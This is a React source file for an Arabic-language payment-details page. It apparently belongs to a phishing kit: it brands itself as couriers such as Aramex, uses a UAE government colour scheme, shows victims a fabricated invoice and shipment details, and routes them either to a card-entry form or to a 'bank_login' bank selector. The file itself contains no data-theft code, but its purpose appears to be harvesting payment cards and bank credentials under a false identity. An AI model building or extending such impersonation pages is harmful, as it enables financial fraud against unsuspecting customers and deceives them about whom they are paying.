import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User, Shield, CheckCircle } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get payment data from link data
  const paymentData = shippingInfo?.payment_data;

  // Get amount from payment data or shipping info
  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);

  const handleProceed = () => {
    // Check payment method from link data
    const paymentMethod = shippingInfo?.payment_method || 'card';

    // If payment method is "card", skip bank selector and go directly to card input
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      // For "bank_login" method, show bank selector
      navigate(`/pay/${id}/bank-selector`);
    }
  };

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126", // UAE Red
    secondary: "#00732F", // UAE Green
    accent: "#000000", // Black
    background: "#FFFFFF", // White
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Payment Data Display */}
      {(shippingInfo || paymentData) && (
        <div className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-xl border" style={{ backgroundColor: uaeColors.background, borderColor: uaeColors.border }}>
          <div className="flex items-center gap-3 mb-4">
            <div
              className="w-10 h-10 rounded-lg flex items-center justify-center"
              style={{ backgroundColor: `${uaeColors.primary}15` }}
            >
              <User className="w-5 h-5" style={{ color: uaeColors.primary }} />
            </div>
            <div>
              <h3 className="font-bold text-lg" style={{ color: uaeColors.accent }}>بيانات السداد</h3>
              <p className="text-xs text-gray-500">معلومات العميل والدفع</p>
            </div>
          </div>

          <div className="space-y-3">
            {paymentData?.customer_name && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <User className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">الاسم</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.customer_name}</span>
              </div>
            )}

            {paymentData?.customer_email && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Hash className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">البريد الإلكتروني</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.customer_email}</span>
              </div>
            )}

            {paymentData?.customer_phone && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Hash className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">رقم الهاتف</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.customer_phone}</span>
              </div>
            )}

            {paymentData?.invoice_number && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Hash className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">الرقم المفوتر</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.invoice_number}</span>
              </div>
            )}

            {paymentData?.selected_service_name && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Truck className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">الخدمة</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.selected_service_name}</span>
              </div>
            )}

            {shippingInfo?.tracking_number && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Hash className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">رقم الشحنة</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{shippingInfo.tracking_number}</span>
              </div>
            )}

            {shippingInfo?.package_description && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Package className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">وصف الطرد</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{shippingInfo.package_description}</span>
              </div>
            )}

            {paymentData?.residential_address && (
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <Hash className="w-4 h-4 text-gray-500" />
                  <span className="text-sm text-gray-600">العنوان</span>
                </div>
                <span className="font-semibold text-sm" style={{ color: uaeColors.accent }}>{paymentData.residential_address}</span>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        {paymentData?.selected_service_name && (
          <div className="flex justify-between items-center p-4 border-2 rounded-xl" style={{ borderColor: uaeColors.border }}>
            <span className="text-sm font-medium text-gray-600">الخدمة</span>
            <span className="font-bold text-base" style={{ color: uaeColors.accent }}>{paymentData.selected_service_name}</span>
          </div>
        )}
        {!paymentData?.selected_service_name && (
          <div className="flex justify-between items-center p-4 border-2 rounded-xl" style={{ borderColor: uaeColors.border }}>
            <span className="text-sm font-medium text-gray-600">الخدمة</span>
            <span className="font-bold text-base" style={{ color: uaeColors.accent }}>{serviceName}</span>
          </div>
        )}

        <div
          className="flex justify-between items-center p-6 rounded-xl text-white shadow-lg"
          style={{ background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})` }}
        >
          <span className="text-lg font-bold">المبلغ الإجمالي</span>
          <span className="text-2xl font-bold">{formattedAmount}</span>
        </div>
      </div>

      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 className="font-bold mb-3 text-lg" style={{ color: uaeColors.accent }}>طريقة الدفع</h3>
        <div
          className="border-2 rounded-xl p-4 transition-all hover:shadow-lg"
          style={{
            borderColor: uaeColors.primary,
            background: `${uaeColors.primary}05`
          }}
        >
          <div className="flex items-center gap-4">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{ backgroundColor: uaeColors.primary }}
            >
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <div className="flex-1">
              <p className="font-bold text-base" style={{ color: uaeColors.accent }}>الدفع بالبطاقة</p>
              <p className="text-sm text-gray-600">
                Visa، Mastercard، Mada، مدفوعات آمنة ومشفرة
              </p>
            </div>
            <CheckCircle className="w-6 h-6" style={{ color: uaeColors.secondary }} />
          </div>
        </div>
      </div>

      {/* Security Badge */}
      <div className="mb-6 p-4 bg-gray-50 rounded-xl border border-gray-200">
        <div className="flex items-center gap-3">
          <Shield className="w-5 h-5" style={{ color: uaeColors.secondary }} />
          <div>
            <p className="text-sm font-semibold" style={{ color: uaeColors.accent }}>دفع آمن ومشفر</p>
            <p className="text-xs text-gray-500">جميع المعاملات محمية بأعلى معايير الأمان</p>
          </div>
        </div>
      </div>

      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90 shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})`
        }}
      >
        <span className="ml-2">متابعة الدفع</span>
        <ArrowLeft className="w-5 h-5" />
      </Button>

      <p className="text-xs text-center text-gray-500 mt-4">
        بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;
